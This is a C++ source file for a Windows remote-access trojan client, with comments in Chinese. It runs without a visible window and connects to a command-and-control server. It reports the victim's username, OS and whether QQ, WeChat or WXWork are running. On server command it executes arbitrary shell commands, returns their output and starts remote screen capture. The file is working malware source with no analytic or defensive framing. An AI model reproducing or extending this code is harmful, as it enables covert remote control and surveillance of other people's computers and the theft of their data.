#include <iostream>
#include <WinSock2.h>
#include <string>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <sstream>
#include <locale>
#include <codecvt>
#include <windows.h>
#include <WS2tcpip.h>
#include "include.h"
#include "remote.h"
#include<stdio.h>

#include <stdio.h>
#include "xor.h"
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
#pragma comment(lib, "ws2_32.lib")


#pragma warning(disable:4996)
#define bad_socket -1

DWORD WINAPI excute(LPVOID lpParamter);

LPSTR getusername();
WCHAR* getpidname(DWORD pid);
std::string GetSystemName();
WCHAR* pidname;
DWORD processId;
std::string uid;
std::string process_name;
std::string s_version;
std::string QQstatus;
std::string Wechatstatus;
std::string QYWechatstatus;


SOCKET C2_socks;
std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

std::string GetSystemName()
{
    SYSTEM_INFO info;        //用SYSTEM_INFO结构判断64位AMD处理器   
    GetSystemInfo(&info);    //调用GetSystemInfo函数填充结构   
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    std::string osname = "unknown OperatingSystem.";

    if (GetVersionEx((OSVERSIONINFO*)&os))
    {
        //下面根据版本信息判断操作系统名称   
        switch (os.dwMajorVersion)//判断主版本号  
        {
        case 4:
            switch (os.dwMinorVersion)//判断次版本号   
            {
            case 0:
                if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
                    osname = "Microsoft Windows NT 4.0"; //1996年7月发布   
                else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
                    osname = "Microsoft Windows 95";
                break;
            case 10:
                osname = "Microsoft Windows 98";
                break;
            case 90:
                osname = "Microsoft Windows Me";
                break;
            }
            break;

        case 5:
            switch (os.dwMinorVersion)   //再比较dwMinorVersion的值  
            {
            case 0:
                osname = "Microsoft Windows 2000";//1999年12月发布  
                break;

            case 1:
                osname = "Microsoft Windows XP";//2001年8月发布  
                break;

            case 2:
                if (os.wProductType == VER_NT_WORKSTATION
                    && info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                {
                    osname = "Microsoft Windows XP Professional x64 Edition";
                }
                else if (GetSystemMetrics(SM_SERVERR2) == 0)
                    osname ="Microsoft Windows Server 2003";//2003年3月发布   
                else if (GetSystemMetrics(SM_SERVERR2) != 0)
                    osname = "Microsoft Windows Server 2003 R2";
                break;
            }
            break;

        case 6:
            switch (os.dwMinorVersion)
            {
            case 0:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows Vista";
                else
                    osname = "Microsoft Windows Server 2008";//服务器版本   
                break;
            case 1:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 7";
                else
                    osname = "Microsoft Windows Server 2008 R2";
                break;
            case 2:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 8";
                else
                    osname = "Microsoft Windows Server 2012";
                break;
            case 3:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 8.1";
                else
                    osname = "Microsoft Windows Server 2012 R2";
                break;
            }
            break;

        case 10:
            switch (os.dwMinorVersion)
            {
            case 0:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 10";
                else
                    osname = "Microsoft Windows Server 2016 Technical Preview";//服务器版本   
                break;
            }
            break;
        }
    }

    return osname;
}


bool isProgramRunning(std::string program_name)
{
    bool ret = false;
    HANDLE info_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //拍摄系统中所有进程的快照
    if (info_handle == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot fail!!\n\n");
        return false;
    }

    PROCESSENTRY32W program_info;
    program_info.dwSize = sizeof(PROCESSENTRY32W);  //设置结构体大小
    int bResult = Process32FirstW(info_handle, &program_info); //获取所有进程中第一个进程的信息
    if (!bResult)
    {
        printf("Process32FirstW fail!!\n\n");
        return false;
    }

    while (bResult)
    {
        std::string pro_name = converter.to_bytes(program_info.szExeFile);
        if (program_name == pro_name)
        {
            ret = true;
            break;
        }
        //获得下一个进程的进程信息

        bResult = Process32Next(info_handle, &program_info);
    }
    CloseHandle(info_handle);//关闭句柄
    return ret;
}

DWORD WINAPI ExecuteCommand(LPVOID lpParam)
{
    const char* command = (char *)lpParam;
    std::cout << command << std::endl;
    // 执行命令并获取输出结果
    FILE* pipe = _popen(command, "r");
    if (pipe == NULL)
    {
        
        return 1;
    }

    // 读取输出结果并打印到控制台
    const int bufferSize = 128;
    char buffer[bufferSize];
    char result[4096] = "";
    while (fgets(buffer, bufferSize, pipe) != NULL)
    {
        strcat(result, buffer);
    }
    if (strlen(result) < 2) {
        strcat(result, "error");
    }
    std::string utf8Result;
    int utf8Length = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
    if (utf8Length > 0)
    {
        wchar_t* wideBuffer = new wchar_t[utf8Length];
        MultiByteToWideChar(CP_ACP, 0, result, -1, wideBuffer, utf8Length);

        int utf8BufferLength = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, NULL, 0, NULL, NULL);
        if (utf8BufferLength > 0)
        {
            utf8Result.resize(utf8BufferLength);
            WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, &utf8Result[0], utf8BufferLength, NULL, NULL);
        }

        delete[] wideBuffer;
    }

    char rec[4096] = "";
    strcpy(rec, "cmd ");
    strcat(rec, utf8Result.c_str());

    send(C2_socks, rec, strlen(rec), 0);
    // 关闭管道
    _pclose(pipe);

    return 0;
}

int cmdline() {
    std::cout << "啓動命令行成功"<<std::endl;
    int ret;
    char recData[1024];
    char sendData[1024];
    HANDLE remote_thread =NULL;
    ret = recv(C2_socks, recData, 1024, 0);
    if (ret > 0) {
        recData[ret] = 0x00;	// 0x表示16进制  
        std::cout << recData;
        if (strncmp(recData, "COSJDASO",8)==0) {
            send(C2_socks, "COSJDASO<========>LOAD==", strlen("COSJDASO<========>LOAD=="), 0);
        }
    }else { return -1;}

    while (1) {

        memset(recData, 0, 1024);
        memset(sendData, 0, 1024);
        ret = recv(C2_socks, recData, 1024, 0);
        if (ret > 0) {
            recData[ret] = 0x00;	// 0x表示16进制  
            std::cout << recData;
            if (strncmp(recData, "detail", 6)==0) {
                snprintf(sendData,1024,"007<===>NULL<===>%s<===>%s<===>%s<===>%ld<===>%s<===>%s<===>%s",uid.c_str(), s_version.c_str(), process_name.c_str(),processId,QQstatus.c_str(),Wechatstatus.c_str(),QYWechatstatus.c_str());

                send(C2_socks, sendData, strlen(sendData), 0);
            }else if(strncmp(recData, "SCREEN", 6) == 0) {
                if (remote_thread != NULL) {
                    CloseHandle(remote_thread);  // 关闭之前的线程，如果存在的话
                }

                remote_thread = CreateThread(NULL, 0, look_init, NULL, 0, NULL);
            }
            else if (strncmp(recData, "STOP_SCREEN", 11) == 0) {
                if (remote_thread != NULL) {
                    TerminateThread(remote_thread, 0);
                    CloseHandle(remote_thread);

                }
                
            }
            else if (strncmp(recData, "shell", 5) == 0) {

                std::string delimiter = " ";
                std::string str = recData;
                // 查找第一个空格字符的位置
                size_t pos = str.find(delimiter);
                char rec[1024];
                if (pos != std::string::npos && pos < str.length() - 1) {
                    // 提取子字符串
                    std::string result = str.substr(pos + 1);

                    // 将子字符串转换为 char* 类型
                    
                    strcpy(rec, result.c_str());
                    HANDLE threadHandle = CreateThread(NULL, 0, ExecuteCommand, (LPVOID)rec, 0, NULL);
                    if (threadHandle == NULL)
                    {
                        printf("无法创建线程\n");
                        return 1;
                    }


                    CloseHandle(threadHandle);
                    
                }
                else {
                    send(C2_socks, "error", strlen("error"), 0);
                }
                

            }
        
        }else{ return -1; }
    }

}



int setup_socket() {
    C2_socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (C2_socks == INVALID_SOCKET) {
        return bad_socket;
    }
    sockaddr_in servAddr;
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(C2port);
    servAddr.sin_addr.S_un.S_addr = inet_addr(C2ip);	  // 服务器的IP，本机可以用127.0.0.1
    if (connect(C2_socks, (LPSOCKADDR)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
    {
        closesocket(C2_socks);
        return bad_socket;
    }
    return 0;
}



DWORD WINAPI update_info(LPVOID lpParamter) {
    processId = GetCurrentProcessId();
    uid = getusername();
    process_name = converter.to_bytes(getpidname(processId));
    s_version = GetSystemName();
    delete[] pidname;
    while (1) {

        if (isProgramRunning("QQ.exe")){ 
            QQstatus = "Yes";
        }
        else {
            QQstatus = "No";
        }
        if (isProgramRunning("WeChat.exe")) {
            Wechatstatus = "Yes";
        }
        else {
            Wechatstatus = "No";
        }
        if (isProgramRunning("WXWork.exe")) {
            QYWechatstatus = "Yes";
        }
        else {
            QYWechatstatus = "No";
        }
        Sleep(2000);
    }


}

int main()
{


    WORD ver = MAKEWORD(2, 2);
    WSADATA dat;
    if (WSAStartup(ver, &dat) != 0) {
        return 0;
    }
    while (1) {

        if (setup_socket() != 0) {
            continue;
        }
        HANDLE thread = CreateThread(NULL, 0, update_info, NULL, 0, NULL);
        cmdline();
        closesocket(C2_socks);

        CloseHandle(thread);
        Sleep(10000);
    }



    WSACleanup();
    return 0;
}

LPSTR getusername()
{
    char name[100];
    DWORD buf = 100;
    GetUserNameA(name, &buf);
    return name;
}

WCHAR* getpidname(DWORD pid)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR* processname = new WCHAR[100];  // 动态分配内存
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // 遍历进程快照，查找当前进程
        if (Process32First(hSnapshot, &pe32))
        {
            do
            {
                if (pe32.th32ProcessID == pid)
                {
                    // 输出进程名称
                    wcscpy_s(processname, 100, pe32.szExeFile);

                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        // 关闭进程快照句柄
        CloseHandle(hSnapshot);
        return processname;
    }

    // 如果无法获取进程名，则返回空指针
    return nullptr;
}